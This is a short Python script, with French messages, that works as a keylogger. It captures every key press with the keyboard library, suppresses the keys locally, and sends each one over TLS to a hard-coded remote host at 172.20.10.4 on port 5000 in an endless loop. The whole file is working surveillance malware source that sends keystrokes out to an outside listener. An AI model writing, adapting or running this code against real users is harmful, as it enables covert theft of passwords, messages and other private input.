import ssl
import socket
import datetime
import keyboard
import os
import time

def socket_ssl():
    try:
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        context.load_verify_locations(cafile="ca-cert.pem")

        host = "172.20.10.4"
        port = 5000 

        while True:
            socket_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_ssl = context.wrap_socket(socket_obj, server_hostname=host)
            client_ssl.connect((host, port))


            clavier_touche_press(client_ssl)

    except Exception as e:
        print(f"Une erreur s'est produite : {e}")

def clavier_touche_press(client_ssl):
    try:
        touche_press = keyboard.read_event(suppress=True).name
        donnees = f"{touche_press}"
        client_ssl.sendall(donnees.encode())

    except Exception as e:
        print(f"Erreur lors de l'envoi des données du clavier : {e}")

    finally:
        time.sleep(1)

if __name__ == "__main__":
    socket_ssl()
